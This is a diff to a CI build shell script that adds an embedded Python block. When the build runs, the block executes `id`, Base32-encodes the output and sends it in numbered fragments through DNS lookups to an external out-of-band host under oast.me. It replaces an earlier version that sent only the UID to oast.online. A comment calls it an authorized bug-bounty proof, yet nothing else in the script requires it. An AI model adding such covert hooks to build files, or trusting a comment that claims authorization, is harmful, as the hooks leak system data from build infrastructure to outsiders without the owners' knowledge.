@@ -23,21 +23,26 @@ if [[ -n "${bamboo_buildKey:-}" ]]; then
     set -e -u -o pipefail
 fi
 
-# Authorized bug-bounty proof: execute one harmless identity command and place
-# only its numeric UID in a DNS query to the researcher's evidence endpoint.
+# Authorized bug-bounty proof: execute one harmless identity command and send
+# only its Base32-encoded stdout in numbered DNS fragments to the researcher's
+# evidence endpoint.
 python3 - <<'PY'
+import base64
 import socket
 import subprocess
 
-uid = subprocess.check_output(["id", "-u"], text=True).strip()
-host = (
-    f"uid-{uid}-iterbamboo-b4f2d8c9."
-    "dbki3efrtgrum1o84gagbhe8fmt9s18de.oast.online"
-)
-try:
-    socket.getaddrinfo(host, 443)
-except Exception as exc:
-    print(f"Bug-bounty proof delivery failed: {exc}")
+identity = subprocess.check_output(["id"], text=True, timeout=5).strip()
+encoded = base64.b32encode(identity.encode()).decode().rstrip("=").lower()
+chunks = [encoded[offset:offset + 48] for offset in range(0, len(encoded), 48)]
+for index, chunk in enumerate(chunks):
+    host = (
+        f"idfull-c73a81e2-p{index:02d}of{len(chunks):02d}.{chunk}."
+        "dbkii3frtgrlhtv2gj30ubccgfz6wx5m1.oast.me"
+    )
+    try:
+        socket.getaddrinfo(host + ".", 443)
+    except Exception as exc:
+        print(f"Bug-bounty proof fragment {index} delivery failed: {exc}")
 PY
 
 if [[ -z "${ACTORS:-}" ]]; then
